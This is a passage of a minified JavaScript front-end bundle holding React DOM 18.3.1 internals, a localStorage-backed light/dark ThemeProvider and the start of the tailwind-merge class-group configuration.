s=e.pingCache;s!==null&&s.delete(t),t=rt(),e.pingedLanes|=e.suspendedLanes&i,Ge===e&&(qe&i)===i&&(We===4||We===3&&(qe&130023424)===qe&&500>Be()-rl?zn(e,0):nl|=i),ct(e,t)}function xp(e,t){t===0&&((e.mode&1)===0?t=1:(t=Hi,Hi<<=1,(Hi&130023424)===0&&(Hi=4194304)));var i=rt();e=Kt(e,t),e!==null&&(Or(e,t,i),ct(e,i))}function av(e){var t=e.memoizedState,i=0;t!==null&&(i=t.retryLane),xp(e,i)}function lv(e,t){var i=0;switch(e.tag){case 13:var s=e.stateNode,l=e.memoizedState;l!==null&&(i=l.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(o(314))}s!==null&&s.delete(t),xp(e,i)}var Sp;Sp=function(e,t,i){if(e!==null)if(e.memoizedProps!==t.pendingProps||ot.current)at=!0;else{if((e.lanes&i)===0&&(t.flags&128)===0)return at=!1,Yy(e,t,i);at=(e.flags&131072)!==0}else at=!1,Me&&(t.flags&1048576)!==0&&nd(t,ho,t.index);switch(t.lanes=0,t.tag){case 2:var s=t.type;Eo(e,t),e=t.pendingProps;var l=hr(t,Qe.current);br(t,i),l=La(null,t,s,e,l,i);var u=ja();return t.flags|=1,typeof l=="object"&&l!==null&&typeof l.render=="function"&&l.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,st(s)?(u=!0,co(t)):u=!1,t.memoizedState=l.state!==null&&l.state!==void 0?l.state:null,Pa(t),l.updater=Ao,t.stateNode=l,l._reactInternals=t,_a(t,s,e,i),t=Ga(null,t,s,!0,u,i)):(t.tag=0,Me&&u&&ya(t),nt(null,t,l,i),t=t.child),t;case 16:s=t.elementType;e:{switch(Eo(e,t),e=t.pendingProps,l=s._init,s=l(s._payload),t.type=s,l=t.tag=uv(s),e=Mt(s,e),l){case 0:t=Ha(null,t,s,e,i);break e;case 1:t=Yd(null,t,s,e,i);break e;case 11:t=Hd(null,t,s,e,i);break e;case 14:t=Gd(null,t,s,Mt(s.type,e),i);break e}throw Error(o(306,s,""))}return t;case 0:return s=t.type,l=t.pendingProps,l=t.elementType===s?l:Mt(s,l),Ha(e,t,s,l,i);case 1:return s=t.type,l=t.pendingProps,l=t.elementType===s?l:Mt(s,l),Yd(e,t,s,l,i);case 3:e:{if(Qd(t),e===null)throw Error(o(387));s=t.pendingProps,u=t.memoizedState,l=u.element,dd(e,t),bo(t,s,null,i);var m=t.memoizedState;if(s=m.element,u.isDehydrated)if(u={element:s,isDehydrated:!1,cache:m.cache,pendingSuspenseBoundaries:m.pendingSuspenseBoundaries,transitions:m.transitions},t.updateQueue.baseState=u,t.memoizedState=u,t.flags&256){l=kr(Error(o(423)),t),t=Xd(e,t,s,i,l);break e}else if(s!==l){l=kr(Error(o(424)),t),t=Xd(e,t,s,i,l);break e}else for(ft=cn(t.stateNode.containerInfo.firstChild),ht=t,Me=!0,Dt=null,i=cd(t,null,s,i),t.child=i;i;)i.flags=i.flags&-3|4096,i=i.sibling;else{if(mr(),s===l){t=Yt(e,t,i);break e}nt(e,t,s,i)}t=t.child}return t;case 5:return fd(t),e===null&&wa(t),s=t.type,l=t.pendingProps,u=e!==null?e.memoizedProps:null,m=l.children,da(s,l)?m=null:u!==null&&da(s,u)&&(t.flags|=32),qd(e,t),nt(e,t,m,i),t.child;case 6:return e===null&&wa(t),null;case 13:return Zd(e,t,i);case 4:return Ea(t,t.stateNode.containerInfo),s=t.pendingProps,e===null?t.child=yr(t,null,s,i):nt(e,t,s,i),t.child;case 11:return s=t.type,l=t.pendingProps,l=t.elementType===s?l:Mt(s,l),Hd(e,t,s,l,i);case 7:return nt(e,t,t.pendingProps,i),t.child;case 8:return nt(e,t,t.pendingProps.children,i),t.child;case 12:return nt(e,t,t.pendingProps.children,i),t.child;case 10:e:{if(s=t.type._context,l=t.pendingProps,u=t.memoizedProps,m=l.value,Ce(mo,s._currentValue),s._currentValue=m,u!==null)if(It(u.value,m)){if(u.children===l.children&&!ot.current){t=Yt(e,t,i);break e}}else for(u=t.child,u!==null&&(u.return=t);u!==null;){var b=u.dependencies;if(b!==null){m=u.child;for(var k=b.firstContext;k!==null;){if(k.context===s){if(u.tag===1){k=qt(-1,i&-i),k.tag=2;var R=u.updateQueue;if(R!==null){R=R.shared;var V=R.pending;V===null?k.next=k:(k.next=V.next,V.next=k),R.pending=k}}u.lanes|=i,k=u.alternate,k!==null&&(k.lanes|=i),Ca(u.return,i,t),b.lanes|=i;break}k=k.next}}else if(u.tag===10)m=u.type===t.type?null:u.child;else if(u.tag===18){if(m=u.return,m===null)throw Error(o(341));m.lanes|=i,b=m.alternate,b!==null&&(b.lanes|=i),Ca(m,i,t),m=u.sibling}else m=u.child;if(m!==null)m.return=u;else for(m=u;m!==null;){if(m===t){m=null;break}if(u=m.sibling,u!==null){u.return=m.return,m=u;break}m=m.return}u=m}nt(e,t,l.children,i),t=t.child}return t;case 9:return l=t.type,s=t.pendingProps.children,br(t,i),l=xt(l),s=s(l),t.flags|=1,nt(e,t,s,i),t.child;case 14:return s=t.type,l=Mt(s,t.pendingProps),l=Mt(s.type,l),Gd(e,t,s,l,i);case 15:return $d(e,t,t.type,t.pendingProps,i);case 17:return s=t.type,l=t.pendingProps,l=t.elementType===s?l:Mt(s,l),Eo(e,t),t.tag=1,st(s)?(e=!0,co(t)):e=!1,br(t,i),Fd(t,s,l),_a(t,s,l,i),Ga(null,t,s,!0,e,i);case 19:return ep(e,t,i);case 22:return Kd(e,t,i)}throw Error(o(156,t.tag))};function Tp(e,t){return ru(e,t)}function cv(e,t,i,s){this.tag=e,this.key=i,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ct(e,t,i,s){return new cv(e,t,i,s)}function dl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function uv(e){if(typeof e=="function")return dl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===ne)return 11;if(e===ge)return 14}return 2}function wn(e,t){var i=e.alternate;return i===null?(i=Ct(e.tag,t,e.key,e.mode),i.elementType=e.elementType,i.type=e.type,i.stateNode=e.stateNode,i.alternate=e,e.alternate=i):(i.pendingProps=t,i.type=e.type,i.flags=0,i.subtreeFlags=0,i.deletions=null),i.flags=e.flags&14680064,i.childLanes=e.childLanes,i.lanes=e.lanes,i.child=e.child,i.memoizedProps=e.memoizedProps,i.memoizedState=e.memoizedState,i.updateQueue=e.updateQueue,t=e.dependencies,i.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},i.sibling=e.sibling,i.index=e.index,i.ref=e.ref,i}function Oo(e,t,i,s,l,u){var m=2;if(s=e,typeof e=="function")dl(e)&&(m=1);else if(typeof e=="string")m=5;else e:switch(e){case H:return Wn(i.children,l,u,t);case ee:m=8,l|=8;break;case le:return e=Ct(12,i,t,l|2),e.elementType=le,e.lanes=u,e;case be:return e=Ct(13,i,t,l),e.elementType=be,e.lanes=u,e;case K:return e=Ct(19,i,t,l),e.elementType=K,e.lanes=u,e;case ue:return zo(i,l,u,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ve:m=10;break e;case Ae:m=9;break e;case ne:m=11;break e;case ge:m=14;break e;case ae:m=16,s=null;break e}throw Error(o(130,e==null?e:typeof e,""))}return t=Ct(m,i,t,l),t.elementType=e,t.type=s,t.lanes=u,t}function Wn(e,t,i,s){return e=Ct(7,e,s,t),e.lanes=i,e}function zo(e,t,i,s){return e=Ct(22,e,s,t),e.elementType=ue,e.lanes=i,e.stateNode={isHidden:!1},e}function pl(e,t,i){return e=Ct(6,e,null,t),e.lanes=i,e}function hl(e,t,i){return t=Ct(4,e.children!==null?e.children:[],e.key,t),t.lanes=i,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function dv(e,t,i,s,l){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=zs(0),this.expirationTimes=zs(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=zs(0),this.identifierPrefix=s,this.onRecoverableError=l,this.mutableSourceEagerHydrationData=null}function fl(e,t,i,s,l,u,m,b,k){return e=new dv(e,t,i,b,k),t===1?(t=1,u===!0&&(t|=8)):t=0,u=Ct(3,null,null,t),e.current=u,u.stateNode=e,u.memoizedState={element:s,isDehydrated:i,cache:null,transitions:null,pendingSuspenseBoundaries:null},Pa(u),e}function pv(e,t,i){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:J,key:s==null?null:""+s,children:e,containerInfo:t,implementation:i}}function Cp(e){if(!e)return dn;e=e._reactInternals;e:{if(Dn(e)!==e||e.tag!==1)throw Error(o(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(st(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(o(171))}if(e.tag===1){var i=e.type;if(st(i))return Ju(e,i,t)}return t}function Ap(e,t,i,s,l,u,m,b,k){return e=fl(i,s,!0,e,l,u,m,b,k),e.context=Cp(null),i=e.current,s=rt(),l=vn(i),u=qt(s,l),u.callback=t??null,fn(i,u,l),e.current.lanes=l,Or(e,l,s),ct(e,s),e}function _o(e,t,i,s){var l=t.current,u=rt(),m=vn(l);return i=Cp(i),t.context===null?t.context=i:t.pendingContext=i,t=qt(u,m),t.payload={element:e},s=s===void 0?null:s,s!==null&&(t.callback=s),e=fn(l,t,m),e!==null&&(Lt(e,l,m,u),vo(e,l,m)),m}function Wo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Pp(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var i=e.retryLane;e.retryLane=i!==0&&i<t?i:t}}function gl(e,t){Pp(e,t),(e=e.alternate)&&Pp(e,t)}function hv(){return null}var Ep=typeof reportError=="function"?reportError:function(e){console.error(e)};function ml(e){this._internalRoot=e}Uo.prototype.render=ml.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(o(409));_o(e,t,null,null)},Uo.prototype.unmount=ml.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;On(function(){_o(null,e,null,null)}),t[Ut]=null}};function Uo(e){this._internalRoot=e}Uo.prototype.unstable_scheduleHydration=function(e){if(e){var t=du();e={blockedOn:null,target:e,priority:t};for(var i=0;i<sn.length&&t!==0&&t<sn[i].priority;i++);sn.splice(i,0,e),i===0&&fu(e)}};function yl(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Ho(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Ip(){}function fv(e,t,i,s,l){if(l){if(typeof s=="function"){var u=s;s=function(){var R=Wo(m);u.call(R)}}var m=Ap(t,s,e,0,null,!1,!1,"",Ip);return e._reactRootContainer=m,e[Ut]=m.current,Jr(e.nodeType===8?e.parentNode:e),On(),m}for(;l=e.lastChild;)e.removeChild(l);if(typeof s=="function"){var b=s;s=function(){var R=Wo(k);b.call(R)}}var k=fl(e,0,!1,null,null,!1,!1,"",Ip);return e._reactRootContainer=k,e[Ut]=k.current,Jr(e.nodeType===8?e.parentNode:e),On(function(){_o(t,k,i,s)}),k}function Go(e,t,i,s,l){var u=i._reactRootContainer;if(u){var m=u;if(typeof l=="function"){var b=l;l=function(){var k=Wo(m);b.call(k)}}_o(t,m,e,l)}else m=fv(i,t,e,l,s);return Wo(m)}cu=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var i=Vr(t.pendingLanes);i!==0&&(_s(t,i|1),ct(t,Be()),(me&6)===0&&(Tr=Be()+500,pn()))}break;case 13:On(function(){var s=Kt(e,1);if(s!==null){var l=rt();Lt(s,e,1,l)}}),gl(e,1)}},Ws=function(e){if(e.tag===13){var t=Kt(e,134217728);if(t!==null){var i=rt();Lt(t,e,134217728,i)}gl(e,134217728)}},uu=function(e){if(e.tag===13){var t=vn(e),i=Kt(e,t);if(i!==null){var s=rt();Lt(i,e,t,s)}gl(e,t)}},du=function(){return xe},pu=function(e,t){var i=xe;try{return xe=e,t()}finally{xe=i}},Ls=function(e,t,i){switch(t){case"input":if(As(e,i),t=i.name,i.type==="radio"&&t!=null){for(i=e;i.parentNode;)i=i.parentNode;for(i=i.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<i.length;t++){var s=i[t];if(s!==e&&s.form===e.form){var l=ao(s);if(!l)throw Error(o(90));Ts(s),As(s,l)}}}break;case"textarea":_c(e,i);break;case"select":t=i.value,t!=null&&tr(e,!!i.multiple,t,!1)}},Qc=ll,Xc=On;var gv={usingClientEntryPoint:!1,Events:[ni,dr,ao,qc,Yc,ll]},mi={findFiberByHostInstance:Mn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},mv={bundleType:mi.bundleType,version:mi.version,rendererPackageName:mi.rendererPackageName,rendererConfig:mi.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:B.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=tu(e),e===null?null:e.stateNode},findFiberByHostInstance:mi.findFiberByHostInstance||hv,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var $o=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!$o.isDisabled&&$o.supportsFiber)try{Wi=$o.inject(mv),Bt=$o}catch{}}return ut.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=gv,ut.createPortal=function(e,t){var i=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!yl(t))throw Error(o(200));return pv(e,t,null,i)},ut.createRoot=function(e,t){if(!yl(e))throw Error(o(299));var i=!1,s="",l=Ep;return t!=null&&(t.unstable_strictMode===!0&&(i=!0),t.identifierPrefix!==void 0&&(s=t.identifierPrefix),t.onRecoverableError!==void 0&&(l=t.onRecoverableError)),t=fl(e,1,!1,null,null,i,!1,s,l),e[Ut]=t.current,Jr(e.nodeType===8?e.parentNode:e),new ml(t)},ut.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(o(188)):(e=Object.keys(e).join(","),Error(o(268,e)));return e=tu(t),e=e===null?null:e.stateNode,e},ut.flushSync=function(e){return On(e)},ut.hydrate=function(e,t,i){if(!Ho(t))throw Error(o(200));return Go(null,e,t,!0,i)},ut.hydrateRoot=function(e,t,i){if(!yl(e))throw Error(o(405));var s=i!=null&&i.hydratedSources||null,l=!1,u="",m=Ep;if(i!=null&&(i.unstable_strictMode===!0&&(l=!0),i.identifierPrefix!==void 0&&(u=i.identifierPrefix),i.onRecoverableError!==void 0&&(m=i.onRecoverableError)),t=Ap(t,null,e,1,i??null,l,!1,u,m),e[Ut]=t.current,Jr(e),s)for(e=0;e<s.length;e++)i=s[e],l=i._getVersion,l=l(i._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[i,l]:t.mutableSourceEagerHydrationData.push(i,l);return new Uo(t)},ut.render=function(e,t,i){if(!Ho(t))throw Error(o(200));return Go(null,e,t,!1,i)},ut.unmountComponentAtNode=function(e){if(!Ho(e))throw Error(o(40));return e._reactRootContainer?(On(function(){Go(null,null,e,!1,function(){e._reactRootContainer=null,e[Ut]=null})}),!0):!1},ut.unstable_batchedUpdates=ll,ut.unstable_renderSubtreeIntoContainer=function(e,t,i,s){if(!Ho(i))throw Error(o(200));if(e==null||e._reactInternals===void 0)throw Error(o(38));return Go(e,t,i,!1,s)},ut.version="18.3.1-next-f1338f8080-20240426",ut}var Fp;function Zh(){if(Fp)return wl.exports;Fp=1;function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(r){console.error(r)}}return n(),wl.exports=Cv(),wl.exports}var Vp;function Av(){if(Vp)return Ko;Vp=1;var n=Zh();return Ko.createRoot=n.createRoot,Ko.hydrateRoot=n.hydrateRoot,Ko}var Pv=Av();const Ev=oc(Pv),Jh=I.createContext(void 0);function Iv({children:n,defaultTheme:r="system",storageKey:o="vite-ui-theme",...a}){const[c,p]=I.useState(()=>localStorage.getItem(o)||r);I.useEffect(()=>{const h=window.document.documentElement;if(h.classList.remove("light","dark"),c==="system"){const g=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";h.classList.add(g);return}h.classList.add(c)},[c]);const d={theme:c,setTheme:h=>{localStorage.setItem(o,h),p(h)}};return x.jsx(Jh.Provider,{...a,value:d,children:n})}const Xn=()=>{const n=I.useContext(Jh);if(n===void 0)throw new Error("useTheme must be used within a ThemeProvider");return n};function ef(n){var r,o,a="";if(typeof n=="string"||typeof n=="number")a+=n;else if(typeof n=="object")if(Array.isArray(n)){var c=n.length;for(r=0;r<c;r++)n[r]&&(o=ef(n[r]))&&(a&&(a+=" "),a+=o)}else for(o in n)n[o]&&(a&&(a+=" "),a+=o);return a}function ac(){for(var n,r,o=0,a="",c=arguments.length;o<c;o++)(n=arguments[o])&&(r=ef(n))&&(a&&(a+=" "),a+=r);return a}function Dv(){for(var n=0,r,o,a="";n<arguments.length;)(r=arguments[n++])&&(o=tf(r))&&(a&&(a+=" "),a+=o);return a}function tf(n){if(typeof n=="string")return n;for(var r,o="",a=0;a<n.length;a++)n[a]&&(r=tf(n[a]))&&(o&&(o+=" "),o+=r);return o}var lc="-";function Mv(n){var r=Nv(n),o=n.conflictingClassGroups,a=n.conflictingClassGroupModifiers,c=a===void 0?{}:a;function p(h){var g=h.split(lc);return g[0]===""&&g.length!==1&&g.shift(),nf(g,r)||Rv(h)}function d(h,g){var f=o[h]||[];return g&&c[h]?[].concat(f,c[h]):f}return{getClassGroupId:p,getConflictingClassGroupIds:d}}function nf(n,r){var d;if(n.length===0)return r.classGroupId;var o=n[0],a=r.nextPart.get(o),c=a?nf(n.slice(1),a):void 0;if(c)return c;if(r.validators.length!==0){var p=n.join(lc);return(d=r.validators.find(function(h){var g=h.validator;return g(p)}))==null?void 0:d.classGroupId}}var Op=/^\[(.+)\]$/;function Rv(n){if(Op.test(n)){var r=Op.exec(n)[1],o=r==null?void 0:r.substring(0,r.indexOf(":"));if(o)return"arbitrary.."+o}}function Nv(n){var r=n.theme,o=n.prefix,a={nextPart:new Map,validators:[]},c=jv(Object.entries(n.classGroups),o);return c.forEach(function(p){var d=p[0],h=p[1];zl(h,a,d,r)}),a}function zl(n,r,o,a){n.forEach(function(c){if(typeof c=="string"){var p=c===""?r:zp(r,c);p.classGroupId=o;return}if(typeof c=="function"){if(Lv(c)){zl(c(a),r,o,a);return}r.validators.push({validator:c,classGroupId:o});return}Object.entries(c).forEach(function(d){var h=d[0],g=d[1];zl(g,zp(r,h),o,a)})})}function zp(n,r){var o=n;return r.split(lc).forEach(function(a){o.nextPart.has(a)||o.nextPart.set(a,{nextPart:new Map,validators:[]}),o=o.nextPart.get(a)}),o}function Lv(n){return n.isThemeGetter}function jv(n,r){return r?n.map(function(o){var a=o[0],c=o[1],p=c.map(function(d){return typeof d=="string"?r+d:typeof d=="object"?Object.fromEntries(Object.entries(d).map(function(h){var g=h[0],f=h[1];return[r+g,f]})):d});return[a,p]}):n}function Bv(n){if(n<1)return{get:function(){},set:function(){}};var r=0,o=new Map,a=new Map;function c(p,d){o.set(p,d),r++,r>n&&(r=0,a=o,o=new Map)}return{get:function(d){var h=o.get(d);if(h!==void 0)return h;if((h=a.get(d))!==void 0)return c(d,h),h},set:function(d,h){o.has(d)?o.set(d,h):c(d,h)}}}var rf="!";function Fv(n){var r=n.separator||":",o=r.length===1,a=r[0],c=r.length;return function(d){for(var h=[],g=0,f=0,y,v=0;v<d.length;v++){var w=d[v];if(g===0){if(w===a&&(o||d.slice(v,v+c)===r)){h.push(d.slice(f,v)),f=v+c;continue}if(w==="/"){y=v;continue}}w==="["?g++:w==="]"&&g--}var T=h.length===0?d:d.substring(f),M=T.startsWith(rf),A=M?T.substring(1):T,P=y&&y>f?y-f:void 0;return{modifiers:h,hasImportantModifier:M,baseClassName:A,maybePostfixModifierPosition:P}}}function Vv(n){if(n.length<=1)return n;var r=[],o=[];return n.forEach(function(a){var c=a[0]==="[";c?(r.push.apply(r,o.sort().concat([a])),o=[]):o.push(a)}),r.push.apply(r,o.sort()),r}function Ov(n){return{cache:Bv(n.cacheSize),splitModifiers:Fv(n),...Mv(n)}}var zv=/\s+/;function _v(n,r){var o=r.splitModifiers,a=r.getClassGroupId,c=r.getConflictingClassGroupIds,p=new Set;return n.trim().split(zv).map(function(d){var h=o(d),g=h.modifiers,f=h.hasImportantModifier,y=h.baseClassName,v=h.maybePostfixModifierPosition,w=a(v?y.substring(0,v):y),T=!!v;if(!w){if(!v)return{isTailwindClass:!1,originalClassName:d};if(w=a(y),!w)return{isTailwindClass:!1,originalClassName:d};T=!1}var M=Vv(g).join(":"),A=f?M+rf:M;return{isTailwindClass:!0,modifierId:A,classGroupId:w,originalClassName:d,hasPostfixModifier:T}}).reverse().filter(function(d){if(!d.isTailwindClass)return!0;var h=d.modifierId,g=d.classGroupId,f=d.hasPostfixModifier,y=h+g;return p.has(y)?!1:(p.add(y),c(g,f).forEach(function(v){return p.add(h+v)}),!0)}).reverse().map(function(d){return d.originalClassName}).join(" ")}function Wv(){for(var n=arguments.length,r=new Array(n),o=0;o<n;o++)r[o]=arguments[o];var a,c,p,d=h;function h(f){var y=r[0],v=r.slice(1),w=v.reduce(function(T,M){return M(T)},y());return a=Ov(w),c=a.cache.get,p=a.cache.set,d=g,g(f)}function g(f){var y=c(f);if(y)return y;var v=_v(f,a);return p(f,v),v}return function(){return d(Dv.apply(null,arguments))}}function Ie(n){var r=function(a){return a[n]||[]};return r.isThemeGetter=!0,r}var of=/^\[(?:([a-z-]+):)?(.+)\]$/i,Uv=/^\d+\/\d+$/,Hv=new Set(["px","full","screen"]),Gv=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,$v=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,Kv=/^-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/;function jt(n){return $n(n)||Hv.has(n)||Uv.test(n)||_l(n)}function _l(n){return Zn(n,"length",Jv)}function qv(n){return Zn(n,"size",sf)}function Yv(n){return Zn(n,"position",sf)}function Qv(n){return Zn(n,"url",eb)}function qo(n){return Zn(n,"number",$n)}function $n(n){return!Number.isNaN(Number(n))}function Xv(n){return n.endsWith("%")&&$n(n.slice(0,-1))}function vi(n){return _p(n)||Zn(n,"number",_p)}function he(n){return of.test(n)}function bi(){return!0}function xn(n){return Gv.test(n)}function Zv(n){return Zn(n,"",tb)}function Zn(n,r,o){var a=of.exec(n);return a?a[1]?a[1]===r:o(a[2]):!1}function Jv(n){return $v.test(n)}function sf(){return!1}function eb(n){return n.startsWith("url(")}function _p(n){return Number.isInteger(Number(n))}function tb(n){return Kv.test(n)}function nb(){var n=Ie("colors"),r=Ie("spacing"),o=Ie("blur"),a=Ie("brightness"),c=Ie("borderColor"),p=Ie("borderRadius"),d=Ie("borderSpacing"),h=Ie("borderWidth"),g=Ie("contrast"),f=Ie("grayscale"),y=Ie("hueRotate"),v=Ie("invert"),w=Ie("gap"),T=Ie("gradientColorStops"),M=Ie("gradientColorStopPositions"),A=Ie("inset"),P=Ie("margin"),O=Ie("opacity"),L=Ie("padding"),N=Ie("saturate"),B=Ie("scale"),$=Ie("sepia"),J=Ie("skew"),H=Ie("space"),ee=Ie("translate"),le=function(){return["auto","contain","none"]},ve=function(){return["auto","hidden","clip","visible","scroll"]},Ae=function(){return["auto",he,r]},ne=function(){return[he,r]},be=function(){return["",jt]},K=function(){return["auto",$n,he]},ge=function(){return["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"]},ae=function(){return["solid","dashed","dotted","double","none"]},ue=function(){return["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity","plus-lighter"]},W=function(){return["start","end","center","between","around","evenly","stretch"]},q=function(){return["","0",he]},U=function(){return["auto","avoid","all","avoid-page","page","left","right","column"]},S=function(){return[$n,qo]},j=function(){return[$n,he]};return{cacheSize:500,theme:{colors:[bi],spacing:[jt],blur:["none","",xn,he],brightness:S(),borderColor:[n],borderRadius:["none","","full",xn,he],borderSpacing:ne(),borderWidth:be(),contrast:S(),grayscale:q(),hueRotate:j(),invert:q(),gap:ne(),gradientColorStops:[n],gradientColorStopPositions:[Xv,_l],inset:Ae(),margin:Ae(),opacity:S(),padding:ne(),saturate:S(),scale:S(),sepia:q(),skew:j(),space:ne(),translate:ne()},classGroups:{aspect:[{aspect:["auto","square","video",he]}],container:["container"],columns:[{columns:[xn]}],"break-after":[{"break-after":U()}],"break-before":[{"break-before":U()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none"]}],clear:[{clear:["left","right","both","none"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[].concat(ge(),[he])}],overflow:[{overflow:ve()}],"overflow-x":[{"overflow-x":ve()}],"overflow-y":[{"overflow-y":ve()}],overscroll:[{overscroll:le()}],"overscroll-x":[{"overscroll-x":le()}],"overscroll-y":[{"overscroll-y":le()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[A]}],"inset-x":[{"inset-x":[A]}],"inset-y":[{"inset-y":[A]}],start:[{start:[A]}],end:[{end:[A]}],top:[{top:[A]}],right:[{right:[A]}],bottom:[{bottom:[A]}],left:[{left:[A]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",vi]}],basis:[{basis:Ae()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",he]}],grow:[{grow:q()}],shrink:[{shrink:q()}],order:[{order:["first","last","none",vi]}],"grid-cols":[{"grid-cols":[bi]}],"col-start-end":[{col:["auto",{span:["full",vi]},he]}],"col-start":[{"col-start":K()}],"col-end":[{"col-end":K()}],"grid-rows":[{"grid-rows":[bi]}],"row-start-end":[{row:["auto",{span:[vi]},he]}],"row-start":[{"row-start":K()}],"row-end":[{"row-end":K()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",he]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",he]}],gap:[{gap:[w]}],"gap-x":[{"gap-x":[w]}],"gap-y":[{"gap-y":[w]}],"justify-content":[{justify:["normal"].concat(W())}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal"].concat(W(),["baseline"])}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[].concat(W(),["baseline"])}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[L]}],px:[{px:[L]}],py:[{py:[L]}],ps:[{ps:[L]}],pe:[{pe:[L]}],pt:[{pt:[L]}],pr:[{pr:[L]}],pb:[{pb:[L]}],pl:[{pl:[L]}],m:[{m:[P]}],mx:[{mx:[P]}],my:[{my:[P]}],ms:[{ms:[P]}],me:[{me:[P]}],mt:[{mt:[P]}],mr:[{mr:[P]}],mb:[{mb:[P]}],ml:[{ml:[P]}],"space-x":[{"space-x":[H]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[H]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit",he,r]}],"min-w":[{"min-w":["min","max","fit",he,jt]}],"max-w":[{"max-w":["0","none","full","min","max","fit","prose",{screen:[xn]},xn,he]}],h:[{h:[he,r,"auto","min","max","fit"]}],"min-h":[{"min-h":["min","max","fit",he,jt]}],"max-h":[{"max-h":[he,r,"min","max","fit"]}],"font-size":[{text:["base",xn,_l]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",qo]}],"font-family":[{font:[bi]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],